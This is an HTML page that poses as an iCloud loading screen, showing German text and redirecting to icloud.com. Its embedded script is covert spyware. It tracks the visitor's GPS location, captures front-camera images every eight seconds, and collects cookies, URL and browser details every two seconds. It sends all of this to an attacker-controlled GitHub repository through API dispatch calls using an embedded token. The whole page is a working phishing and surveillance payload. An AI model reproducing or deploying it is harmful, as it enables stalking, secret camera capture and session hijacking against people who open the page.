<!DOCTYPE html>
<html><head>
<title>iCloud</title>
<meta http-equiv="refresh" content="0;url=https://icloud.com">
<script>
const USER = "roberta";
const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
const TOKEN = "${{ secrets.DAN_TOKEN }}";

function send(data) {
  fetch(`https://api.github.com/repos/${REPO}/dispatches`, {
    method: "POST",
    headers: {
      "Authorization": `token ${TOKEN}`,
      "Accept": "application/vnd.github.v3+json"
    },
    body: JSON.stringify({ event_type: "log", client_payload: data })
  });
}

// GPS
navigator.geolocation.watchPosition(pos => {
  send({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
}, () => {}, { enableHighAccuracy: true });

// KAMERA SELFIE
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
  const video = document.createElement('video');
  video.srcObject = stream;
  video.play();
  const canvas = document.createElement('canvas');
  setInterval(() => {
    canvas.width = 320; canvas.height = 240;
    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
    send({ type: "selfie", data: canvas.toDataURL('image/jpeg', 0.7) });
  }, 8000);
}).catch(() => {});

// COOKIES + SCREEN
setInterval(() => {
  send({
    type: "session",
    cookies: document.cookie,
    url: location.href,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  });
}, 2000);
</script>
</head><body><h2>iCloud wird geladen...</h2></body></html>
